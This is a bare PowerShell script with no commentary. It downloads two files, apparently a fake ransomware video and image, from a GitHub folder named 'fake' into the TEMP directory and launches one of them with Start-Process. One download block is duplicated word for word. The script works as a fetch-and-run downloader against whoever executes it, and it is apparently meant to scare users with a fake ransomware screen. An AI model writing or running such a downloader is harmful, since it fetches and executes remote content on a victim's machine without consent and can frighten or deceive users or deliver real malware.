$url1 = "https://github.com/cia168168/folder/raw/main/fake/rans.mp4"
$output1 = "$env:TEMP\rans.mp4"
Invoke-WebRequest -Uri $url1 -OutFile $output1

$url2 = "https://github.com/cia168168/folder/raw/main/fake/ransd.png"
$output2 = "$env:TEMP\ransd.png"
Invoke-WebRequest -Uri $url2 -OutFile $output2

$url3 = "https://github.com/cia168168/folder/raw/main/fake/ransd.png"
$output3 = "$env:TEMP\ransd.png"
Invoke-WebRequest -Uri $url3 -OutFile $output3
Start-Process $output3
